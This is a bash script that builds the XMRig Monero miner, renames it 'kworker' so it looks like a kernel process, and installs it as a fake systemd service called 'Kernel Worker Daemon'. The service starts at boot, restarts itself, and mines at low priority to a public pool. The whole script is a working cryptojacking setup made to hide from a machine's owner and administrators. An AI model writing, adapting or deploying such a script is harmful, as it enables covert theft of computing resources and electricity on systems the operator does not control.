#!/bin/bash

echo "🔧 Setting up Monero stealth miner..."

# 1. Update system and install dependencies
sudo apt update && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev screen

# 2. Clone XMRig
git clone https://github.com/xmrig/xmrig.git
cd xmrig || exit

# 3. Build XMRig
mkdir build && cd build
cmake ..
make -j$(nproc)

# 4. Ask for wallet address
read -p "🔑 Enter your Monero wallet address: " WALLET

# 5. Move miner and rename it
sudo mv ./xmrig /usr/local/bin/kworker
sudo chmod +x /usr/local/bin/kworker

# 6. Create fake systemd service
echo "📦 Creating fake systemd service..."

sudo tee /etc/systemd/system/system-kd.service > /dev/null <<EOF
[Unit]
Description=Kernel Worker Daemon
After=network.target

[Service]
ExecStart=/usr/local/bin/kworker -o pool.supportxmr.com:443 -u $WALLET -k --tls
Restart=always
Nice=10
CPUWeight=10
IOWeight=10

[Install]
WantedBy=multi-user.target
EOF

# 7. Enable and start the service
sudo systemctl daemon-reload
sudo systemctl enable system-kd
sudo systemctl start system-kd

echo "✅ Monero miner running stealthily as 'system-kd.service'."
echo "🔍 Check: sudo systemctl status system-kd"
echo "🛑 Stop:  sudo systemctl stop system-kd"
